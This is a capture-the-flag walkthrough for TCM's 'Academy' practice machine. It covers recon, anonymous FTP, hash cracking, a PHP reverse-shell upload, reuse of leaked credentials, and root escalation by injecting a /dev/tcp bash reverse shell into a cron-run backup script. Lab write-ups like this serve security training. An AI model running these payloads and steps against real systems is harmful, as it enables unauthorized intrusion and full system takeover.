# Academy machine by TCM
IP= {target_IP}
---
### Reconnaissance

Nmap scan: \
            nmap -sC -sV -p- {target_IP} -oN scan.initial      

        Nmap scan report for {target_IP}\
        Not shown: 65532 closed tcp ports (conn-refused)\
        PORT   STATE SERVICE VERSION\
        21/tcp open  ftp     vsftpd 3.0.3\
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)\
        |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt\
        | ftp-syst:\
        |   STAT:\
        | FTP server status:\
        |      Connected to ::ffff:{IP}\
        |      Logged in as ftp\
        |      TYPE: ASCII\
        |      No session bandwidth limit\
        |      Session timeout in seconds is 300\
        |      Control connection is plain text\
        |      Data connections will be plain text\
        |      At session startup, client count was 3\
        |      vsFTPd 3.0.3 - secure, fast, stable\
        |*End of status\
        22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\
        | ssh-hostkey:\
        |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)\
        |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)\
        |*  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)\
        80/tcp open  http    Apache httpd 2.4.38 ((Debian))\
        |_http-server-header: Apache/2.4.38 (Debian)\
        |_http-title: Apache2 Debian Default Page: It works\
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\

---
Let's scan with ffuf for directory enumiration

    ffuf -u http://{target_IP}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \

/academy\
/phpmyadmin
---

By exploring the ftp we found a file note.txt

`ftp $IP with login anonymous`

`get note.txt` open the file note.txt

```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

- jdelta 
```
cd73502828457d15655bbd7a63fb0bc8 > md5 > `student` we can check in the https://crackstation.net/ web-site

---

Navigate to `http://{target_IP}/academy` \
and login via credentials that is provide in note.txt\
`10201321` and password is `student`

By exploring the pages we found out that we have a load profile photo that support .php format, by that we will exploit via `file inclusion`

The reverse-shell https://github.com/pentestmonkey/php-reverse-shell > change the IP and port 

we upload the profile photo `shell.php` and after successfully downloaded the file go to 

http://{target_IP}/academy/studentphoto/shell.php

set `nc -lvnp 4444` in the terminal a we got a reverse shell:

`www-data@academy:`

---

Then we go to `www-data@academy:/home/grimmie/` directory and found the file `[backup.sh](http://backup.sh)` let’s print it out:

`www-data@academy:/home/grimmie$ cat backup.sh`

```
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

Go to the following path `/tmp/backup.zip /var/www/html/academy/includes`

and we have a `config.php` file here with mysql credentials:

cat config.php

```
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
```

so now we can go to /phpmyadmin page and login as `grimmie`:

login: `grimmie`
password: `My_V3ryS3cur3_P4ss`

By exploring the tables we found the users:\
`root: 8DEB44F79A130674A714BA1A66387EC111A82BD1 mysql > 26021997`\
`grimmie: FBAFF8215F65CDBF082236E749CD2D772DC921C7 > SHA1 > My_V3ryS3cur3_P4ss`

---

Now we can login via ssh with grimmie credentials:

`ssh grimmie@{target_IP}` and password:`My_V3ryS3cur3_P4ss`

We know that we have a `backup.sh` file that executes, by we dont know how often does it executes:

let download the file to our mashine:

https://github.com/DominicBreuker/pspy?tab=readme-ov-file

it will show all the process that runs

so download it and start `python3 -m http.server 8080` and wget it on your `grimmie` session : wget {your_IP}:8080/pspy64

give it execution `chmod +x pspy64` and run ./pspy64

we get know now, that `backup.sh`  runs every 1 min

so now lets modify and put reverse shell to `backup.sh` file, go to

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

grab the bash shell:
modify and insert your `IP/port` \
`bash -i >& /dev/tcp/{your_IP}/1234 0>&1`

add it ot `backup.sh` file and start listener: `nc -lvnp 1234`

After 1 min it execuses and we got reverse shell with root priviliges.

### Congrats!